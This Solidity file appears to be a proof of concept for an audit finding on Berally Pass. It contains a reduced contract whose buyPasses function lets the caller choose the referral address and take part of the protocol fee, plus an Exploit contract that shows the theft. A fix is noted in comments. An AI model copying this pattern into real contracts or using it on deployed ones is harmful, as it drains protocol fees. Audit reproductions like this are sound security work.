// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Berally Pass — H-01 (Shieldify)
    buyPasses lets the caller pick `referral`. referralFeePercent is 1e16,
    protocolFeePercentage is 5e16. On a 1 ETH pass the caller keeps 0.01 ETH
    that was part of the 0.05 ETH protocol fee. Treasury receives 0.04 ETH. */

contract Receiver {
    receive() external payable {}
}

contract Passes {
    uint256 public protocolFeePercentage = 5e16;
    uint256 public managerFeePercentage = 5e16;
    uint256 public referralFeePercent = 1e16;
    address public treasury;
    address public manager;

    constructor(address _treasury, address _manager) {
        treasury = _treasury;
        manager = _manager;
    }

    function buyPasses(address _manager, uint256 amount, uint256 factor, address referral) public payable {
        require(amount == 1 && factor == 100, "quote");
        uint256 price = 1 ether;
        require(msg.value == price, "value");
        uint256 protocolFee = price * protocolFeePercentage / 1 ether; // [S2]
        uint256 managerFee = price * managerFeePercentage / 1 ether;
        uint256 referralFee = 0;
        if (referral != address(0)) {
            referralFee = price * referralFeePercent / 1 ether; // @> VULN: [S3] the buyer chooses referral and takes this cut of the protocol fee.
            // FIX: only an admin-set referral receives referralFee.
            protocolFee -= referralFee; // [S4]
        }
        (bool success3,) = referral.call{value: referralFee}(""); // [S5]
        (bool success1,) = treasury.call{value: protocolFee}("");
        (bool success2,) = _manager.call{value: managerFee}("");
        require(success1 && success2 && success3, "Unable to send funds");
    }
}

contract Exploit {
    Receiver public treasury; // nonce 1
    Receiver public manager; // nonce 2
    Receiver public referral; // nonce 3
    Passes public passes; // nonce 4

    constructor() {
        treasury = new Receiver();
        manager = new Receiver();
        referral = new Receiver();
        passes = new Passes(address(treasury), address(manager));
    }

    function run() external payable {
        passes.buyPasses{value: msg.value}(address(manager), 1, 100, address(referral)); // [S1]
        require(address(referral).balance == 0.01 ether, "stole 0.01 ETH of protocol fee"); // [S6]
        require(address(treasury).balance == 0.04 ether, "treasury short 0.01 ETH");
    }
}
